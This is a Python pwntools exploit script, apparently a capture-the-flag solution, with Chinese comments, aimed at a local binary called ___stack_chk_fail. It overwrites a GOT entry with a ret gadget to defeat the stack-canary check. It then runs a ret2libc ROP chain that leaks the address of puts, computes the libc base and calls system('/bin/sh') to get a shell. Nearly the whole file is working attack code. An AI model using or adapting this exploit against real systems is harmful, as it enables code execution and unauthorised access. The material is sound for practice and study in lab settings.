from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p = process('./___stack_chk_fail')
elf = ELF('./___stack_chk_fail')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

rdi = 0x401363
ret = 0x40101a
# gdb.attach(p,'b *0x40125e')#mgic里的read
#先使用magic——got法修改got表
payload1 = str(0x404020)
p.sendlineafter(b'addr?\n',payload1)
payload2 = p64(ret)
p.sendafter(b'value?\n',payload2)

# 修改成功后即使je判断canary失败那么也不会怎么样，而是去执行我们写入的ret,可以正常打ret2libc
offset = 0x18
payload3 = b'a'*offset + p64(rdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(elf.sym['vuln'])
p.sendafter(b'>>\n',payload3)
puts_address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
p.success('puts_address -->> 0x%x' % puts_address)
libc_base = puts_address - libc.sym['puts']
p.success('libc_base -->> 0x%x' % libc_base)
system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))

# gdb.attach(p,'b *0x4012b7')#vuln里的read
payload4 =b'a'*offset + p64(ret) + p64(rdi) + p64(bin_sh) + p64(system)
p.sendafter(b'>>\n',payload4)
pause()
# p.interactive()